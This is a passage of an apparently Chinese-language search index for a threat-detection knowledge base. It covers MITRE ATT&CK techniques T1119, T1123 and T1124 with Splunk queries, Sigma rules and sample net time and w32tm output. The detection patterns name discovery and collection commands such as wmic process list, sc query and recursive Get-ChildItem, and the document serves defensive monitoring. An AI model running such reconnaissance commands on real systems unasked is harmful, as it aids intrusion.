\u53d6\u51b3\u4e8e\u7cfb\u7edf\u548c\u7f51\u7edc\u73af\u5883\uff0c\u7c7b\u4f3c\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u53ef\u80fd\u4f1a\u5f88\u4e0d\u6b63\u5e38\u3002\u81ea\u52a8\u6536\u96c6\u53ef\u80fd\u4f1a\u4e0e\u5176\u4ed6\u6280\u672f\uff08\u4f8b\u5982\u6570\u636e\u6682\u5b58\uff09\u4e00\u8d77\u53d1\u751f\u3002\u8fd9\u6837\uff0c\u6587\u4ef6\u8bbf\u95ee\u76d1\u89c6\u663e\u793a\u4e86\u6267\u884c\u987a\u5e8f\u6587\u4ef6\u6253\u5f00\u7684\u5f02\u5e38\u8fc7\u7a0b\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u4e00\u6b21\u5c06\u52a8\u4f5c\u590d\u5236\u5230\u591a\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u53ef\u80fd\u8868\u793a\u81ea\u52a8\u6536\u96c6\u884c\u4e3a\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u6570\u636e\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u6570\u636e\u3002 \u201cindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\findstr.exe\u201d\u201d CommandLine=\u201d\u201d*/e*\u201d\u201d) //findstr used to search for a specefic file extension index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*get-childitem*\u201d\u201d //search for specefic file with get-childitem in powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-ChildItem -Recurse *\u201d\u201d //search for specefic file recursivly with get-childitem in powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-Service*\u201d\u201d //get service information with powershell index=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d Message=\u201d\u201d*Get-process*\u201d\u201d //get process information with powershell index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\sc.exe\u201d\u201d CommandLine=\u201d\u201d*query*\u201d\u201d) //get service list with sc.exe index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*Process list*) //get process list with wmic.exe index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\wmic.exe\u201d\u201d CommandLine=*service list*) //get service list with wmic.exe","title":"splunk\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u4ee5\u53capowershell\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1119-win-%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86/#_7","text":"MITRE-ATT&CK-T1119 https://attack.mitre.org/techniques/T1119/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/","text":"T1123-win-\u97f3\u9891\u6536\u96c6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8ba1\u7b97\u673a\u7684\u5916\u56f4\u8bbe\u5907\uff08\u4f8b\u5982\uff0c\u9ea6\u514b\u98ce\u548c\u7f51\u7edc\u6444\u50cf\u5934\uff09\u6216\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff0c\u8bed\u97f3\u548c\u89c6\u9891\u547c\u53eb\u670d\u52a1\uff09\u6765\u6355\u83b7\u97f3\u9891\u8bb0\u5f55\uff0c\u4ee5\u4fbf\u4fa6\u542c\u654f\u611f\u7684\u5bf9\u8bdd\u4ee5\u6536\u96c6\u4fe1\u606f\u3002 \u6076\u610f\u8f6f\u4ef6\u6216\u811a\u672c\u53ef\u80fd\u7528\u4e8e\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u53ef\u7528API\u4e0e\u8bbe\u5907\u8fdb\u884c\u4ea4\u4e92\u4ee5\u6355\u83b7\u97f3\u9891\u3002\u97f3\u9891\u6587\u4ef6\u53ef\u80fd\u4f1a\u5199\u5165\u78c1\u76d8\u5e76\u5728\u4ee5\u540e\u88ab\u6cc4\u6f0f\u3002 \u6d4b\u8bd5\u6848\u4f8b soundrec\u53ef\u4ee5\u901a\u8fc7\u5f00\u53d1\u677f\u91c7\u96c6\u58f0\u97f3\uff0c\u5e76\u901a\u8fc7\u7535\u8111\u7aef\u663e\u793a\u6ce2\u5f62\uff0c\u9002\u7528\u4e8e 5402 dsp\u5f00\u53d1\u677f\u3002 \u68c0\u6d4b\u65e5\u5fd7 Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u7531\u4e8e\u53ef\u80fd\u4f1a\u4f7f\u7528\u5404\u79cdAP\u200b\u200bI\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u6b64\u6280\u672f\u3002\u53d6\u51b3\u4e8e\u6b63\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u65b9\u5f0f\uff0c\u6709\u5173API\u4f7f\u7528\u7684\u9065\u6d4b\u6570\u636e\u53ef\u80fd\u6ca1\u6709\u7528\uff0c\u4f46\u53ef\u4ee5\u4e3a\u53d1\u751f\u5728\u7cfb\u7edf\u4e0a\u7684\u5176\u4ed6\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u53ef\u80fd\u6307\u793a\u6280\u672f\u4f7f\u7528\u7684\u884c\u4e3a\u5305\u62ec\u672a\u77e5\u6216\u5f02\u5e38\u7684\u8fdb\u7a0b\u8bbf\u95ee\u4e0e\u4e0e\u9ea6\u514b\u98ce\uff0c\u5f55\u97f3\u8bbe\u5907\u6216\u5f55\u97f3\u8f6f\u4ef6\u4ea4\u4e92\u7684\u8bbe\u5907\u6216\u8f6f\u4ef6\u76f8\u5173\u8054\u7684API\uff0c\u4ee5\u53ca\u5468\u671f\u6027\u5730\u5c06\u5305\u542b\u97f3\u9891\u6570\u636e\u7684\u6587\u4ef6\u5199\u5165\u78c1\u76d8\u7684\u8fdb\u7a0b\u3002 \u201cindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d \u201c\u201d*WindowsAudioDevice-Powershell-Cmdlet*\u201d\u201d //use voice cmdlet in powershell index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\explorer.exe\u201d\u201d CommandLine=\u201d\u201d*WindowsSoundRecorder*\u201d\u201d) OR (EventCode=1 Image=\u201d\u201d*\\\\soundrec.exe\u201d\u201d) // soundrecorder started with this command:explorer.exe shell:appsFolder\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 CommandLine=\u201d\u201d*/DURATION*\u201d\u201d) OR (EventCode=1 CommandLine=\u201d\u201d*/FILE*\u201d\u201d) // check all commandlines that used /DURATION and /FILE as a output file in it\u201d \u5efa\u8bae \u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1123 https://attack.mitre.org/techniques/T1123/","title":"T1123-win-\u97f3\u9891\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#t1123-win-","text":"","title":"T1123-win-\u97f3\u9891\u6536\u96c6"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8ba1\u7b97\u673a\u7684\u5916\u56f4\u8bbe\u5907\uff08\u4f8b\u5982\uff0c\u9ea6\u514b\u98ce\u548c\u7f51\u7edc\u6444\u50cf\u5934\uff09\u6216\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff0c\u8bed\u97f3\u548c\u89c6\u9891\u547c\u53eb\u670d\u52a1\uff09\u6765\u6355\u83b7\u97f3\u9891\u8bb0\u5f55\uff0c\u4ee5\u4fbf\u4fa6\u542c\u654f\u611f\u7684\u5bf9\u8bdd\u4ee5\u6536\u96c6\u4fe1\u606f\u3002 \u6076\u610f\u8f6f\u4ef6\u6216\u811a\u672c\u53ef\u80fd\u7528\u4e8e\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u53ef\u7528API\u4e0e\u8bbe\u5907\u8fdb\u884c\u4ea4\u4e92\u4ee5\u6355\u83b7\u97f3\u9891\u3002\u97f3\u9891\u6587\u4ef6\u53ef\u80fd\u4f1a\u5199\u5165\u78c1\u76d8\u5e76\u5728\u4ee5\u540e\u88ab\u6cc4\u6f0f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_1","text":"soundrec\u53ef\u4ee5\u901a\u8fc7\u5f00\u53d1\u677f\u91c7\u96c6\u58f0\u97f3\uff0c\u5e76\u901a\u8fc7\u7535\u8111\u7aef\u663e\u793a\u6ce2\u5f62\uff0c\u9002\u7528\u4e8e 5402 dsp\u5f00\u53d1\u677f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_2","text":"Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#splunk","text":"\u7531\u4e8e\u53ef\u80fd\u4f1a\u4f7f\u7528\u5404\u79cdAP\u200b\u200bI\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u6b64\u6280\u672f\u3002\u53d6\u51b3\u4e8e\u6b63\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u65b9\u5f0f\uff0c\u6709\u5173API\u4f7f\u7528\u7684\u9065\u6d4b\u6570\u636e\u53ef\u80fd\u6ca1\u6709\u7528\uff0c\u4f46\u53ef\u4ee5\u4e3a\u53d1\u751f\u5728\u7cfb\u7edf\u4e0a\u7684\u5176\u4ed6\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u53ef\u80fd\u6307\u793a\u6280\u672f\u4f7f\u7528\u7684\u884c\u4e3a\u5305\u62ec\u672a\u77e5\u6216\u5f02\u5e38\u7684\u8fdb\u7a0b\u8bbf\u95ee\u4e0e\u4e0e\u9ea6\u514b\u98ce\uff0c\u5f55\u97f3\u8bbe\u5907\u6216\u5f55\u97f3\u8f6f\u4ef6\u4ea4\u4e92\u7684\u8bbe\u5907\u6216\u8f6f\u4ef6\u76f8\u5173\u8054\u7684API\uff0c\u4ee5\u53ca\u5468\u671f\u6027\u5730\u5c06\u5305\u542b\u97f3\u9891\u6570\u636e\u7684\u6587\u4ef6\u5199\u5165\u78c1\u76d8\u7684\u8fdb\u7a0b\u3002 \u201cindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d \u201c\u201d*WindowsAudioDevice-Powershell-Cmdlet*\u201d\u201d //use voice cmdlet in powershell index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\explorer.exe\u201d\u201d CommandLine=\u201d\u201d*WindowsSoundRecorder*\u201d\u201d) OR (EventCode=1 Image=\u201d\u201d*\\\\soundrec.exe\u201d\u201d) // soundrecorder started with this command:explorer.exe shell:appsFolder\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 CommandLine=\u201d\u201d*/DURATION*\u201d\u201d) OR (EventCode=1 CommandLine=\u201d\u201d*/FILE*\u201d\u201d) // check all commandlines that used /DURATION and /FILE as a output file in it\u201d","title":"splunk\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_7","text":"MITRE-ATT&CK-T1123 https://attack.mitre.org/techniques/T1123/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/","text":"T1124-\u7cfb\u7edf\u65f6\u95f4\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows\u65f6\u95f4\u670d\u52a1\u5728\u57df\u4e2d\u8bbe\u7f6e\u548c\u5b58\u50a8\u7cfb\u7edf\u65f6\u95f4\uff0c\u4ee5\u7ef4\u62a4\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u7684\u65f6\u95f4\u540c\u6b65\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4ece\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u6536\u96c6\u7cfb\u7edf\u65f6\u95f4\u6216\u65f6\u533a\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u5728Windows\u4e0a\u7684Net\u7a0b\u5e8f\u4e0a\u901a\u8fc7\u6267\u884cnet time\u76f8\u5173\u547d\u4ee4\u6765\u8fdb\u884c\u6536\u96c6\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u7684\u7cfb\u7edf\u65f6\u95f4\u3002\u4e5f\u53ef\u4ee5\u4ece\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\u63a8\u65ad\u53d7\u5bb3\u4eba\u7684\u65f6\u533a\uff0c\u4f7f\u7528\u6536\u96c6w32tm /tz\u3002\u8be5\u4fe1\u606f\u53ef\u80fd\u5bf9\u6267\u884c\u5176\u4ed6\u6280\u672f\u5f88\u6709\u7528\uff0c\u4f8b\u5982\u4f7f\u7528\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u6587\u4ef6\u7b49\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u4e0b\u5229\u7528net time\u76f8\u5173\u547d\u4ee4\u67e5\u770b\u672c\u5730\u4e3b\u673a\u5f53\u524d\u65f6\u95f4\u3002 - \u67e5\u770b\u57df\u65f6\u95f4\u53ca\u57df\u670d\u52a1\u5668\u7684\u540d\u5b57\uff1anet time /domain - Nslookup -type=SRV _ldap._tcp. \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>net time \\\\ICBC \\\\ICBC \u7684\u5f53\u524d\u65f6\u95f4\u662f 2019/11/10 20:09:50 \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>w32tm /tz \u65f6\u533a: \u5f53\u524d:TIME_ZONE_ID_UNKNOWN \u504f\u91cf: -480\u5206 (UTC=\u672c\u5730\u65f6\u95f4+Bias) [\u6807\u51c6\u540d\u79f0:\"\u4e2d\u56fd\u6807\u51c6\u65f6\u95f4\" \u504f\u91cf:0\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)] [\u590f\u65f6\u5236\u540d\u79f0:\"\u4e2d\u56fd\u590f\u4ee4\u65f6\" \u504f\u91cf:-60\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)] \u6d4b\u8bd5\u7559\u75d5 windows\u65e5\u5fd7\u30014688\u30014689\u3001\u547d\u4ee4\u884c\u53c2\u6570 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1124 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net time * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 time * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection4: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1124 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: w32tm /tz #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1124 https://attack.mitre.org/techniques/T1124/","title":"T1124-\u7cfb\u7edf\u65f6\u95f4\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#t1124-","text":"","title":"T1124-\u7cfb\u7edf\u65f6\u95f4\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#attck","text":"Windows\u65f6\u95f4\u670d\u52a1\u5728\u57df\u4e2d\u8bbe\u7f6e\u548c\u5b58\u50a8\u7cfb\u7edf\u65f6\u95f4\uff0c\u4ee5\u7ef4\u62a4\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u7684\u65f6\u95f4\u540c\u6b65\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4ece\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u6536\u96c6\u7cfb\u7edf\u65f6\u95f4\u6216\u65f6\u533a\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u5728Windows\u4e0a\u7684Net\u7a0b\u5e8f\u4e0a\u901a\u8fc7\u6267\u884cnet time\u76f8\u5173\u547d\u4ee4\u6765\u8fdb\u884c\u6536\u96c6\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u7684\u7cfb\u7edf\u65f6\u95f4\u3002\u4e5f\u53ef\u4ee5\u4ece\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\u63a8\u65ad\u53d7\u5bb3\u4eba\u7684\u65f6\u533a\uff0c\u4f7f\u7528\u6536\u96c6w32tm /tz\u3002\u8be5\u4fe1\u606f\u53ef\u80fd\u5bf9\u6267\u884c\u5176\u4ed6\u6280\u672f\u5f88\u6709\u7528\uff0c\u4f8b\u5982\u4f7f\u7528\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u6587\u4ef6\u7b49\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_1","text":"windows\u4e0b\u5229\u7528net time\u76f8\u5173\u547d\u4ee4\u67e5\u770b\u672c\u5730\u4e3b\u673a\u5f53\u524d\u65f6\u95f4\u3002 - \u67e5\u770b\u57df\u65f6\u95f4\u53ca\u57df\u670d\u52a1\u5668\u7684\u540d\u5b57\uff1anet time /domain - Nslookup -type=SRV _ldap._tcp.","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_3","text":"C:\\Windows\\system32>net time \\\\ICBC \\\\ICBC \u7684\u5f53\u524d\u65f6\u95f4\u662f 2019/11/10 20:09:50 \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Users\\Administrator>w32tm /tz \u65f6\u533a: \u5f53\u524d:TIME_ZONE_ID_UNKNOWN \u504f\u91cf: -480\u5206 (UTC=\u672c\u5730\u65f6\u95f4+Bias) [\u6807\u51c6\u540d\u79f0:\"\u4e2d\u56fd\u6807\u51c6\u65f6\u95f4\" \u504f\u91cf:0\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)] [\u590f\u65f6\u5236\u540d\u79f0:\"\u4e2d\u56fd\u590f\u4ee4\u65f6\" \u504f\u91cf:-60\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)]","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_4","text":"windows\u65e5\u5fd7\u30014688\u30014689\u3001\u547d\u4ee4\u884c\u53c2\u6570","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1124 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net time * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 time * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection4: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows 